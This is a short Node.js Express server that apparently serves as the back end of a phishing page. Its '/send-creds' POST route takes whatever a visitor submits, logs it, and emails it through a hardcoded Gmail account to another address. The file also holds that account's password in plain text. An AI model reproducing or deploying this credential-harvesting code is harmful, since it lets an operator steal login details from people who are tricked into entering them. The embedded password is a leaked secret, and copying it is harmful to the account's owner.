const express = require("express");

const app = express();
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');

// parse application/x-www-form-urlencoded
app.use(bodyParser.urlencoded({ extended: false }))
 
// parse application/json
app.use(bodyParser.json())

app.use(express.static('public'))

app.get('/',(req,res)=>{
    res.render(__dirname+"/index.html")
});

app.post('/send-creds',(req,res)=>{
console.log(req.body);


    var transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'hi.ashu143@gmail.com',
        pass: 'ashuashu@'
    }
    });

    var mailOptions = {
        from: 'hi.ashu143@gmail.com',
        to: 'ashutosh131991@gmail.com',
        subject: 'Sending Email using Node.js',
        text: JSON.stringify(req.body)
    };

    transporter.sendMail(mailOptions, function(error, info){
    if (error) {
        console.log(error);
    } else {
        console.log('Email sent: ' + info.response);
    }
    });
});

app.listen(3000,()=>console.log("Port 3000"))